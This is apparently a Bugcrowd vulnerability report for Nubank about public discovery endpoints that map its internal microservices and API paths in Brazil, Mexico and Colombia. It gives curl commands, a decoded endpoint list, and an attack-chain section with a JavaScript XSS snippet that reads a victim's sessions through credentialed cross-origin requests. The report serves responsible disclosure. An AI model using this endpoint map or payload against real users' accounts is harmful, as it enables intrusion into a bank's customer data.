# Bugcrowd Finding #21 — Unauthenticated API Discovery Endpoints Expose Complete Internal Microservice Map (BR/MX/CO)

**Program:** Nubank Bug Bounty (Bugcrowd)
**Date:** 2026-09-01
**Severity (Standalone):** P3 Medium — Unauthenticated disclosure of all internal production microservice names and API paths
**Severity (Chained):** P2 High — Provides exact attack roadmap for CORS-credentialed exploitation (Finding #2)
**VRT:** Server Security Misconfiguration > Disclosure of Known Files or Directories
**Related:** Finding #2 (CORS wildcard subdomain reflection), Finding #4 (CSP bypass chain)

---

## Summary

Three unauthenticated HTTP endpoints — one per country — publicly expose complete JSON maps of all Nubank production internal microservice API endpoints across Brazil, Mexico, and Colombia. These discovery endpoints are referenced in Nubank frontend JavaScript and require no authentication, cookies, or API keys to access.

**Publicly accessible discovery endpoints:**
- Brazil: `https://prod-global-discovery-cf.nubank.com.br/api/discovery`
- Mexico: `https://prod-global-discovery-cf.nu.com.mx/api/discovery`
- Colombia: `https://prod-global-discovery-cf.nu.com.co/api/discovery`

Each endpoint returns 25–35 named API entries including authentication, password reset, customer session management, payment processing, certificate generation, and internal service-to-service proxy tokens.

---

## Technical Evidence

### 1. Brazil Discovery Endpoint (prod-global-discovery-cf.nubank.com.br)

```bash
curl -s "https://prod-global-discovery-cf.nubank.com.br/api/discovery" \
  -H "X-Correlation-Id: bc-handle" | python3 -m json.tool
```

**HTTP Response:** 200 OK, `content-type: application/json`
**Server:** AmazonS3 (via CloudFront)

**Full decoded response (proxy backend URLs extracted from base64):**

```json
{
  "login":                      "https://prod-global-auth.nubank.com.br/api/token",
  "request_password_reset":     "https://prod-global-auth.nubank.com.br/api/reset-password",
  "reset_password":             "https://prod-global-auth.nubank.com.br/api/reset-password/complete",
  "auth_gen_certificates":      "https://prod-global-auth.nubank.com.br/api/gen-certificates",
  "auth_device_resend_code":    "https://prod-global-auth.nubank.com.br/api/device/authorize-resend-code",
  "get_customer_sessions":      "https://prod-global-ana-mary.nubank.com.br/api/customers/:id/sessions",
  "company_social_invite_by_slug": "https://prod-global-ana-mary.nubank.com.br/api/company-invite/social/slug/:slug",
  "register_prospect_company":  "https://prod-global-ana-mary.nubank.com.br/api/company-application",
  "msat":                       "https://prod-global-mica.nubank.com.br/api/msat",
  "auto_reply_evaluation":      "https://prod-global-mica.nubank.com.br/api/auto-reply-evaluation/evaluate",
  "call_authentication":        "https://prod-global-stevie.nubank.com.br/api/call-management/advices",
  "call_authentication_v2":     "https://prod-global-stevie.prod-waf.nubank.com.br/api/call-management/v2/advices",
  "phone_numbers_to_authenticate": "https://prod-global-stevie.prod-waf.nubank.com.br/api/call-management/our-phone-numbers",
  "protected_hello_activation_usage": "https://prod-global-stevie.prod-waf.nubank.com.br/api/protected-hello/activation/usage",
  "application_status_by_tax_id": "https://prod-global-customs.nubank.com.br/api/app/tax-id/application-status",
  "email_verify":               "https://prod-global-customs.prod-waf.nubank.com.br/api/email/verify",
  "register_prospect":          "https://prod-global-customs.prod-waf.nubank.com.br/api/prospect/register",
  "register_prospect_savings_web": "https://prod-global-customs.prod-waf.nubank.com.br/api/prospect/register/savings-web",
  "register_prospect_ultraviolet_web": "https://prod-global-customs.prod-waf.nubank.com.br/api/prospect/register/ultraviolet-web",
  "register_prospect_global_web": "https://prod-global-customs.prod-waf.nubank.com.br/api/prospect/register/global-web",
  "business_card_waitlist":     "https://prod-global-bird-box.nubank.com.br/api/credit-card-waitlist",
  "register_prospect_c":        "https://prod-global-bird-box.nubank.com.br/api/company-prospects",
  "transaction_note":           "https://prod-global-web-savings-accounts.prod-waf.nubank.com.br/api/customers/:id/transaction/:transaction-id/note",
  "request_receipt":            "https://prod-global-web-savings-accounts.prod-waf.nubank.com.br/api/customers/:id/request-receipt",
  "pusher_auth_channel":        "https://prod-global-chat-client.nubank.com.br/api/pusher/auth",
  "common_xp_exposure_log":     "https://prod-global-web-cookie.nubank.com.br/api/public/subjects/ea3edbbcb0cd4fba/experiments/exposure-log",
  "common_xp":                  "https://prod-global-web-cookie.prod-waf.nubank.com.br/api/public/keys/ea3edbbcb0cd4fba/experiments/groups",
  "web_common_xp":              "https://prod-global-nu-website-br-xp.prod-waf.nubank.com.br/api/public/keys/ea3edbbcb0cd4fba/experiments/groups",
  "web_entry_router":           "https://prod-global-bom-dia-e-cia.prod-waf.nubank.com.br/api/web/entry-router",
  "mmp_deeplink_url":           "https://prod-global-mmp-gateway.nubank.com.br/api/deeplink-url"
}
```

**Internal microservices revealed (Brazil):**
| Service | Function |
|---------|----------|
| `prod-global-auth` | Authentication: token, password reset, certificates, device auth |
| `prod-global-ana-mary` | Customer data: sessions, company applications, social invites |
| `prod-global-mica` | Multi-step authentication (MSAT), auto-reply evaluation |
| `prod-global-stevie` | Call authentication, phone verification, protected hello |
| `prod-global-customs` | Prospect registration, KYC, email verification, tax ID lookup |
| `prod-global-bird-box` | Business credit card waitlist, company prospects |
| `prod-global-web-savings-accounts` | Savings account: transaction notes, receipts |
| `prod-global-chat-client` | Real-time chat via Pusher |
| `prod-global-web-cookie` | A/B testing experiments |
| `prod-global-bom-dia-e-cia` | Web entry router |
| `prod-global-mmp-gateway` | Deep link URL generation |
| `prod-global-webapp-proxy` | CORS-respecting reverse proxy (routes all above) |

---

### 2. Mexico Discovery Endpoint (prod-global-discovery-cf.nu.com.mx)

```bash
curl -s "https://prod-global-discovery-cf.nu.com.mx/api/discovery" \
  -H "X-Correlation-Id: bc-handle" | python3 -m json.tool
```

**HTTP Response:** 200 OK, returns 35 endpoints

**Additional microservices revealed (Mexico-specific):**
| Service | Function |
|---------|----------|
| `prod-global-bureau-mx` | Mexican credit bureau (Buró de Crédito): authorization requests, FC3/OTP |
| `prod-global-gotere` | Candidate registration (KYC onboarding) |
| `prod-global-la-banda` | CURP/RFC document generation, INE scan validation |
| `prod-global-credolab-client` | Credolab behavioral data collection |
| `prod-global-geo` | Geographic API: regions, states, cities lookup |

**Selected Mexico endpoints:**
```
bureau_authorization_request_create → https://prod-global-bureau-mx.nu.com.mx/api/authorization-requests
bureau_authorization_request_confirm → https://prod-global-bureau-mx.nu.com.mx/api/authorization-requests/confirm
bureau_authorization_request_check → https://prod-global-bureau-mx.nu.com.mx/api/authorization-requests/check
generate_rfc_curp → https://prod-global-la-banda.nu.com.mx/api/documents/curp-and-rfc
ine_scan_validation_create → https://prod-global-la-banda.nu.com.mx/api/ine-scan/validation/create
ine_scan_validation_ocr → https://prod-global-la-banda.nu.com.mx/api/ine-scan/entity/validation-ocr
save_collected_data → https://prod-global-credolab-client.nu.com.mx/api/save-collected-data
```

---

### 3. Colombia Discovery Endpoint (prod-global-discovery-cf.nu.com.co)

```bash
curl -s "https://prod-global-discovery-cf.nu.com.co/api/discovery" \
  -H "X-Correlation-Id: bc-handle" | python3 -m json.tool
```

**HTTP Response:** 200 OK, returns 30 endpoints

**Additional microservices revealed (Colombia-specific):**
| Service | Function |
|---------|----------|
| `prod-global-global-hadou` | PSE payment system: authorization, link creation, payment cancellation |
| `prod-s0-lionel-hutz` | Document/contract retrieval (shard-based naming) |
| `prod-global-hourglass` | Prospect waitlist registration |
| `prod-global-manifestando` | Financial goals |
| `prod-global-credolab-client` | Credolab behavioral data collection |

**PSE payment endpoints (Colombia):**
```
pse_post_authorization_request_link_co → https://prod-global-global-hadou.nu.com.co/api/authorization/request/link
pse_get_authorization_details_co → https://prod-global-global-hadou.nu.com.co/api/authorization/details-web
pse_post_cancel_payment_co → https://prod-global-global-hadou.nu.com.co/api/cancel-payment-web
```

**Document endpoints:**
```
get_documents_co → https://prod-s0-lionel-hutz.nu.com.co/api/get-documents
get_contracts_co → https://prod-s0-lionel-hutz.nu.com.co/api/get-contracts
```

---

### 4. Proxy Token Structure

The webapp-proxy URLs contain HMAC-signed tokens in the format:
```
https://prod-global-webapp-proxy.{TLD}/api/proxy/{HMAC_TOKEN}.{BASE64_BACKEND_URL}
```

The HMAC_TOKEN controls which backend URLs the proxy will forward requests to. These tokens are:
- **Statically distributed** (embedded in the discovery JSON, unchanged per deployment)
- Not time-limited (no expiry in the token structure observed)
- Control of which exact internal backend endpoint will receive the proxied request

---

## Security Impact

### Standalone — Information Disclosure

The public discovery endpoints reveal:
1. **All internal microservice names** — Nubank's complete service architecture (11+ BR services, 5+ MX-specific, 5+ CO-specific)
2. **Exact API paths** — Including authentication (`/api/token`), session management (`/api/customers/:id/sessions`), password reset (`/api/reset-password`, `/api/reset-password/complete`), and financial operations (PSE payments, transaction notes)
3. **Proxy token structure** — HMAC tokens that authorize specific backend routes through the CORS proxy
4. **Shard naming patterns** — `prod-s0-*` pattern suggests additional numbered shards (`s1`, `s2`, etc.) for customer data

### Chained with CORS (Finding #2) — P2 High Attack Amplification

```
[Step 1] Attacker reads discovery endpoint (no auth required):
  GET https://prod-global-discovery-cf.nubank.com.br/api/discovery
  → Receives: complete API map with 30 endpoints and signed proxy tokens

[Step 2] Attacker identifies XSS on any *.nubank.com.br subdomain:
  → Uses discovery data to enumerate CORS-reachable endpoints
  → No guessing required for API paths

[Step 3] XSS payload with precise API targeting:
  const discovery = await fetch('https://prod-global-discovery-cf.nubank.com.br/api/discovery').then(r=>r.json());
  // login endpoint is discovery.login (prod-global-auth proxy URL)
  // customer sessions: discovery.get_customer_sessions
  // password reset: discovery.reset_password
  
  // All endpoints accessible via CORS with victim's credentials (Finding #2)
  const sessions = await fetch(discovery.get_customer_sessions.replace(':id','me'), {credentials:'include'}).then(r=>r.json());
  // Victim's active sessions exposed
```

---

## Comparison with Intended Behavior

| Aspect | Observed | Expected |
|--------|----------|----------|
| Authentication to access | None required | Should require Origin header validation or auth |
| API path disclosure | Complete (25-35 endpoints per country) | Should be limited to non-sensitive paths |
| Internal service names | All revealed | Should not be publicly disclosed |
| Proxy HMAC tokens | Statically distributed | Tokens are acceptable if proxy enforces auth separately |

**Note:** The discovery pattern is a common frontend architecture (similar to HAL APIs), but should be restricted to requests from known trusted origins via CORS-preflight, not served to all unauthenticated clients.

---

## Remediation

| Issue | Fix |
|-------|-----|
| Unauthenticated access | Add CORS-only serving: only return discovery data when `Origin` header matches a Nubank-controlled domain |
| Sensitive endpoint exposure | Remove internal service names from discovery; expose only the webapp-proxy URLs (which already obfuscate backend URLs) |
| Static HMAC tokens | Consider rotating tokens periodically or making them session-bound |
| Shard enumeration | Remove `prod-s0-*` naming from client-facing URLs to prevent shard enumeration |

---

## Notes

- All requests passive (GET only, no POST/modification attempted)
- Discovery JSON content analyzed to extract backend URLs by base64-decoding proxy paths
- No authenticated access to any microservice was attempted
- PSE payment endpoints (Colombia) and credit bureau endpoints (Mexico) are particularly sensitive to disclose
- All requests used `X-Correlation-Id: bc-handle` as required
